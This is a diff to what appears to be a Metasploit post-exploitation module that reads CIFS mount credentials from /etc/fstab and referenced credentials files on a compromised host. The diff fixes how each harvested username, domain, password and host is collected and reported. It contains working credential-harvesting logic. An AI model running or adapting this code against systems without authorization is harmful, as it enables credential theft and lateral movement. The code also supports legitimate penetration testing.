@@ -47,10 +47,10 @@ class Metasploit3 < Msf::Post
       cred = {}
       # if the fstab line utilizies the credentials= option, read the credentials from that file
       if (fstab_line =~ /\/\/([^\/]+)\/\S+\s+\S+\s+cifs\s+.*/)
-        host = $1
+        cred[:host] = $1
         # IPs can occur using the ip option, which is a backup/alternative
         # to letting UNC resolution do its thing
-        host = $1 if (fstab_line =~ /ip=([^, ]+)/)
+        cred[:host] = $1 if (fstab_line =~ /ip=([^, ]+)/)
         if (fstab_line =~ /cred(?:entials)?=([^, ]+)/)
           file = $1
           # skip if we've already parsed this credentials file
@@ -58,11 +58,13 @@ class Metasploit3 < Msf::Post
           # store it if we haven't
           cred_files << file
           # parse the credentials
-          creds << parse_credentials_file(file)
+          cred.merge!(parse_credentials_file(file))
         # if the credentials are directly in /etc/fstab, parse them
         elsif (fstab_line =~ /\/\/([^\/]+)\/\S+\s+\S+\s+cifs\s+.*(?:user(?:name)?|pass(?:word)?)=/)
-          creds <<  parse_fstab_credentials(fstab_line)
+          cred.merge!(parse_fstab_credentials(fstab_line))
         end
+
+        creds << cred
       end
     end
 
@@ -71,11 +73,9 @@ class Metasploit3 < Msf::Post
     creds.compact!
     creds.uniq!
     creds.each do |cred|
-      # XXX: currently, you can only report_auth_info on an IP or a valid Host.  in our case,
-      # host[:host] is *not* a Host.  Fix this some day.
       if (Rex::Socket.dotted_ip?(cred[:host]))
         report_cred(
-          ip: rhost,
+          ip: cred[:host],
           port: 445,
           service_name: 'smb',
           user: cred[:user],
@@ -130,7 +130,7 @@ class Metasploit3 < Msf::Post
   end
 
   # Parse mount.cifs credentials from +line+, assumed to be a line from /etc/fstab.
-  # Returns the username+domain and password as a hash, nil if nothing is found.
+  # Returns the username+domain and password as a hash.
   def parse_fstab_credentials(line, file="/etc/fstab")
     creds = {}
     # get the username option, which comes in one of four ways
@@ -159,11 +159,12 @@ class Metasploit3 < Msf::Post
     creds[:user] = "#{$1}\\#{creds[:user]}" if (line =~ /dom(?:ain)?=([^, ]+)/)
 
     creds[:file] = file unless (creds.empty?)
-    (creds.empty? ? nil : creds)
+
+    creds
   end
 
   # Parse mount.cifs credentials from +file+, returning the username+domain and password
-  # as a hash, nil if nothing is found.
+  # as a hash.
   def parse_credentials_file(file)
     creds = {}
     domain = nil
@@ -181,6 +182,6 @@ class Metasploit3 < Msf::Post
     creds[:user] = "#{domain}\\#{creds[:user]}" if (domain and creds[:user])
     creds[:file] = file unless (creds.empty?)
 
-    (creds.empty? ? nil : creds)
+    creds
   end
 end
